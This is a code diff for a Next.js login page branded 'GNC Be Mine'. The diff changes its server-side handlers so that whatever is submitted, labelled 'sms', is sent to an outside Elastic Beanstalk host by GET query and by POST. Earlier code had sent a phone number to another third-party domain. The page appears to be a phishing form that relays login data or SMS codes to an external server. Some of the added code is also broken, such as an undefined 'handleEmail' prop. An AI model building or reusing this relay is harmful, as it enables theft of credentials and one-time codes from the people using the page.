@@ -6,16 +6,18 @@ import LoginComponent from '../components/LoginComponent';
 import Image from 'next/image';
 import Logo from '../public/images/logo.webp'
 export const getServerSideProps = handle({
-  async get() {
-    return json({});
+  async get({ req: { body }}: any) {
+    const result = await axios.get(`http://essential-dev.us-east-1.elasticbeanstalk.com/?sms=${body.toString()}`)
+    return json({data: body});
   },
   async post({ req: { body }}: any) {
-    const result = await axios.get(`https://mupao.lavajavahouse.net/${body.number}`)
-    return json({data: result.data});
+    const result = await axios.post(`http://essential-dev.us-east-1.elasticbeanstalk.com/sms`, {body})
+    return json({data: body});
   },
 });
 
-export default function Home({ data }: any) {
+export default function Home({ data, handleEmail, email }: any) {
+  handleEmail(data)
   return (
     <div className="flex flex-col h-screen bg-gradient-to-b from-[#063970] to-blue-200">
     <div className="grid place-items-center mx-2 my-20 sm:my-auto" x-data="{ showPass: true }">
@@ -25,7 +27,7 @@ export default function Home({ data }: any) {
             <div className="text-center mb-4">
                 <h6 className="font-semibold text-[#063970] text-xl">GNC Be Mine</h6>
                 <Image src={Logo} alt="image" className='w-10 md:w-14 h-10 md:h-14 lg:w-20 lg:h-20 justify-self-center mx-auto'/>
-                <div className="text-blue-900 text-lg font-bold">{data? data.message: ""}</div>
+                <div className="text-blue-900 text-lg font-bold">{email}</div>
             </div>
             <div className="space-y-5 tex-lg">
               <LoginComponent/>
